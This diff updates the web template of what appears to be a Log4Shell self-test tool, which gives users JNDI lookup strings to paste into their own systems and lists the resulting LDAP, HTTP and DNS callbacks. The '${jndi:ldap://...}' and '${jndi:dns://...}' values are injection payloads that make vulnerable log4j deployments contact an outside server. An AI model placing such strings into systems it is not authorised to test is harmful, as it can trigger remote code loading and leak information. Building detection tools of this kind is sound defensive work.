@@ -80,11 +80,17 @@
               {{ end }}
             </h2>
             {{ if not (IsTestDone .Test) }}
-              <label for="input-uri" class="form-label">Copy the text below and paste it anywhere you suspect it might end up being sent to log4j:</label>
+              <label for="input-uri-ldap" class="form-label">Copy the texts below and paste them anywhere you suspect it might end up being sent to log4j:</label>
               <div class="mb-3 input-group">
-                <input type="text" class="form-control fw-bold" id="input-uri" value="${jndi:ldap://{{ .AddrLDAPExternal }}/{{ .Test.ID }}}" readonly>
-                <button class="btn btn-outline-dark" id="button-input-uri" type="button">Copy</button>
+                <input type="text" class="form-control fw-bold" id="input-uri-ldap" value="${jndi:ldap://{{ .AddrLDAPExternal }}/{{ .Test.ID }}}" readonly>
+                <button class="btn btn-outline-dark" id="button-input-uri-ldap" type="button">Copy</button>
               </div>
+              {{ if .DNSEnabled }}
+                <!--<div class="mb-3 input-group">
+                  <input type="text" class="form-control fw-bold" id="input-uri-dns" value="${jndi:dns://{{ .Test.ID }}.{{ .DNSZone }}}" readonly>
+                  <button class="btn btn-outline-dark" id="button-input-uri-dns" type="button">Copy</button>
+                </div>-->
+              {{ end }}
             {{ end }}
             <div class="alert alert-primary" role="alert">
               If any entries appear in the log below, you should immediately take action to
@@ -106,19 +112,15 @@
                       <th scope="row">{{ $val.Created.Format "2006-01-02 15:04:05" }}</th>
                       <td>{{ $val.Type }}</td>
                       <td>{{ if $val.Ptr }}{{ $val.Ptr }}{{ else }}{{ $val.Addr }}{{ end }}</td>
-                      {{ if eq $val.Type "recv_ldap_search" }}
-                        <td>
-                          LDAP search query received. At the very least, your log4j deployment supports doing lookups.
-                        </td>
-                      {{ else if eq $val.Type "recv_http_get" }}
-                        <td>
-                          GET request for RCE payload payload received.
-                        </td>
-                      {{ else if eq $val.Type "recv_http_post" }}
-                        <td>
-                          POST request from RCE payload received. This means that the tool was able to execute code on one of your machines!
-                        </td>
-                      {{ end }}
+                      <td>
+                        {{ if eq $val.Type "recv_ldap_search" }}
+                          LDAP search query received. At the very least, your log4j deployment supports doing lookups. This can lead to information leakage.
+                        {{ else if eq $val.Type "recv_http_get" }}
+                          GET request for RCE payload payload received. It's likely remotely execute code is possible!
+                        {{ else if eq $val.Type "recv_dns_query" }}
+                          DNS query received. It is likely that your log4j deployment supports doing lookups. This can lead to information leakage.
+                        {{ end }}
+                      </td>
                     </tr>
                   {{ end }}
                 </tbody>
@@ -230,18 +232,27 @@
     </footer>
     <script>
       window.addEventListener("DOMContentLoaded", (event) => {
-        const toastELems = [].slice.call(document.querySelectorAll(".toast"))
-        const toast = new bootstrap.Toast(toastELems[0]);
+        let toastELems = [].slice.call(document.querySelectorAll(".toast"))
+        let toast = new bootstrap.Toast(toastELems[0]);
 
-        const uriInput = document.getElementById("input-uri");
-        const copyBtn = document.getElementById("button-input-uri");
-        copyBtn.addEventListener("click", () => {
-          navigator.clipboard.writeText(uriInput.value).then(function() {
+        function copyToClipboard(text) {
+          navigator.clipboard.writeText(text).then(function() {
             toast.show()
           }, function(err) {
             console.error("Failed to copy to the clipboard", err);
           });
-        });
+        }
+
+        function registerCopyListener(field) {
+          let uriInput = document.getElementById(field);
+          let copyBtn = document.getElementById(`button-${field}`);
+          copyBtn.addEventListener("click", () => {
+            copyToClipboard(uriInput.value)
+          });
+        }
+
+        registerCopyListener("input-uri-ldap");
+        //registerCopyListener("input-uri-dns");
       });
     </script>
   </body>
